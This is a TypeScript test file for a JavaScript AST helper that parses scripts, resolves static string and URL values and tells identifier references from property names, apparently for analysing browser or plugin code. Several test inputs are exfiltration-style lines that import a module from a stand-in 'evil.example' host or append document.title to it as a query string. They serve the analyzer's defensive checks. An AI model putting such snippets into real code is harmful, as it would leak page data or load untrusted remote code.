import type { AnyNode, Expression } from "acorn";
import { describe, expect, it } from "vitest";
import { collectStringConstants, isReference, parseJs, staticValue, visit } from "./ast.js";

function firstExpression(code: string): Expression {
  const parsed = parseJs(code, "script");
  if (!parsed.ok) throw new Error(parsed.error);
  const stmt = parsed.program.body[parsed.program.body.length - 1];
  if (!stmt || stmt.type !== "ExpressionStatement") throw new Error("not an expression");
  return stmt.expression;
}

function valueOf(code: string) {
  const parsed = parseJs(code, "script");
  if (!parsed.ok) throw new Error(parsed.error);
  const constants = collectStringConstants(parsed.program);
  const stmt = parsed.program.body[parsed.program.body.length - 1];
  if (!stmt || stmt.type !== "ExpressionStatement") throw new Error("not an expression");
  return staticValue(stmt.expression, constants);
}

describe("parseJs", () => {
  it("parses REPL-style scripts with top-level await and return", () => {
    expect(parseJs("const r = await fetch('/x'); return r.status", "script").ok).toBe(true);
  });

  it("parses Figma plugin code as the body of the async function the bridge wraps it in", () => {
    const parsed = parseJs("const n = await figma.getNodeByIdAsync('1:2'); return n.name;", "async-function-body");
    expect(parsed.ok).toBe(true);
  });

  it("reports syntax errors", () => {
    const parsed = parseJs("location.href = ", "script");
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) expect(parsed.error).toMatch(/Unexpected/);
  });

  it("parses module syntax when a script parse fails", () => {
    expect(parseJs("import x from 'https://evil.example/m.js'; x()", "script").ok).toBe(true);
  });
});

describe("staticValue", () => {
  it("resolves literals, templates and concatenations", () => {
    expect(valueOf("'https://topcv.vn/a'")).toEqual({ exact: "https://topcv.vn/a" });
    expect(valueOf("`https://topcv.vn/b`")).toEqual({ exact: "https://topcv.vn/b" });
    expect(valueOf("'https://topcv.vn' + '/c'")).toEqual({ exact: "https://topcv.vn/c" });
    expect(valueOf("`/api/jobs?page=${n}`")).toEqual({ prefix: "/api/jobs?page=" });
    expect(valueOf("'https://evil.example/?d=' + document.title")).toEqual({ prefix: "https://evil.example/?d=" });
    expect(valueOf("'a' + 1")).toEqual({ exact: "a1" });
  });

  it("resolves single-assignment string constants", () => {
    expect(valueOf("const base = 'https://evil.example/'; base + x")).toEqual({ prefix: "https://evil.example/" });
    expect(valueOf("let u = 'https://a.example/'; u = other; u")).toBeNull();
  });

  it("returns null for values it cannot know", () => {
    expect(valueOf("url")).toBeNull();
    expect(valueOf("x + '/path'")).toBeNull();
    expect(valueOf("getUrl()")).toBeNull();
  });

  it("follows new URL() over absolute strings", () => {
    expect(valueOf("new URL('https://evil.example/x').href")).toEqual({ exact: "https://evil.example/x" });
    expect(valueOf("String('/relative')")).toEqual({ exact: "/relative" });
  });
});

describe("visit and isReference", () => {
  it("tells references from property names and bindings", () => {
    const parsed = parseJs(
      "const eval2 = obj.eval; ({ eval: 1, k: v }); eval('x'); function f(eval3) {} const { a: b } = c; label: for (;;) break label;",
      "script",
    );
    if (!parsed.ok) throw new Error(parsed.error);
    const refs: string[] = [];
    visit(parsed.program, (node: AnyNode, parent, key, ancestors) => {
      if (node.type === "Identifier" && isReference(parent, key, ancestors[ancestors.length - 2] ?? null)) refs.push(node.name);
    });
    expect(refs).toEqual(["obj", "v", "eval", "c"]);
  });

  it("visits every node, parents before children", () => {
    const types: string[] = [];
    visit(firstExpression("a?.b(`${c}`)"), (node) => types.push(node.type));
    expect(types[0]).toBe("ChainExpression");
    expect([...types].sort()).toEqual(
      ["CallExpression", "ChainExpression", "Identifier", "Identifier", "Identifier", "MemberExpression", "TemplateElement", "TemplateElement", "TemplateLiteral"].sort(),
    );
  });
});
